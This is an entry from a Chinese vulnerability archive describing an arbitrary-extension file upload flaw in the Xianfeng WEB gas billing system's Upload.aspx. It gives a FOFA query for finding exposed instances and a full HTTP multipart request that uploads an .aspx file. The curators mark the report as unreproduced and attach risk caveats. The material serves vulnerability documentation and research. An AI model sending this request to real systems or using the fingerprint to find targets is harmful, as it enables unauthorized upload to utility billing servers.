---
source: "wy876 漏洞文库"
title: "先锋WEB燃气收费系统 AjaxService Upload.aspx任意后缀上传"
product: "先锋WEB燃气收费系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知；ASPX解析条件"
prerequisites: "请求无Cookie，权限待核"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/sra2po2of1g77mo7"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%85%88%E9%94%8BWEB%E7%87%83%E6%B0%94%E6%94%B6%E8%B4%B9%E7%B3%BB%E7%BB%9F/%E5%85%88%E9%94%8BWEB%E7%87%83%E6%B0%94%E6%94%B6%E8%B4%B9%E7%B3%BB%E7%BB%9FAjaxService%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"先锋WEB燃气收费系统\""
id: "vw-9f7366d91cab98ab76d0e568"
entity_id: "ve-9f7366d91cab98ab76d0e568"
schema_version: "1"
---

# 先锋WEB燃气收费系统 AjaxService Upload.aspx任意后缀上传

## 条目说明

- 对象与具体问题：先锋WEB燃气收费系统；AjaxService Upload.aspx任意后缀上传
- 版本、配置及部署条件：版本未知；ASPX解析条件
- 认证与权限前提：请求无Cookie，权限待核
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 只有123内容和日期化随机.aspx路径，无响应/执行证据，不能推出服务器权限
- Content-Length710需按短multipart重算，Fdata/Submin拼写需按真实表单保留核验
- HTTP误标Java；补版本/上传目录解析/修复

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
先锋WEB燃气收费系统是由杭州先锋电子技术股份有限公司开发的一款服务于能源行业的系统，先锋WEB燃气收费系统存在文件上传漏洞，可导致攻击者获取服务器权限。

## 二、影响版本
+ 先锋WEB燃气收费系统

## 三、资产测绘
+ fofa`app="先锋WEB燃气收费系统"`
+ 特征


## 四、漏洞复现
```http
POST /AjaxService/Upload.aspx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------38002115147665341923847377752
Origin: null
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------38002115147665341923847377752
Content-Disposition: form-data; name="Fdata"; filename="1ndex.aspx"
Content-Type: text/html


123
-----------------------------38002115147665341923847377752
Content-Disposition: form-data; name="submit"

Submin
-----------------------------38002115147665341923847377752--
```

> 请求长度说明：原资料 Content-Length 为 710；静态长度已移除，应由客户端根据最终请求体的字节数生成。


上传文件位置

```java
/UploadFile/202401/2024011004110066.aspx
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/sra2po2of1g77mo7>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
